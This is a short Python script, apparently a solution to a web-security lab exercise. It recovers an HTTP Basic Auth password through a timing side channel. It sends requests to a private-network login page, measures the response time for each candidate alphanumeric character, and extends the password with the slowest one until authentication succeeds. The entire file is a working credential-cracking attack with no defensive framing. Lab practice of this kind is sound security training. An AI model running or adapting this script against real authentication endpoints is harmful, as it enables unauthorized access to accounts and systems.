# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
import sys
import time


tests = []
small_letters = map(chr, range(ord('a'), ord('z')+1))
big_letters = map(chr, range(ord('A'), ord('Z')+1))
digits = map(chr, range(ord('0'), ord('9')+1))
# tests.update(small_letters)
# tests.update(big_letters)
# tests.update(digits)
for t in range(ord('a'), ord('z')+1):
	tests.append(str(chr(t)))

for t in range(ord('A'), ord('Z')+1):
	tests.append(str(chr(t)))
for t in range(ord('0'), ord('9')+1):
	tests.append(str(chr(t)))


password = ""

while True:
	t_max = 0
	letter = ''
	for l in tests:
		print(f"{str(password+l)}")
		start = time.time()
		resp = requests.get('http://10.0.1.15/authentication/example2/', auth=HTTPBasicAuth('hacker', password+l))
		end = time.time()
		if (resp.status_code != 401):
			print(f"Password is : {password+l}")
			exit()
		else:
			time_test = end - start
			if t_max < time_test:
				t_max = time_test
				letter = l
	password = password+letter
	print(f"Candidate {password}")

	
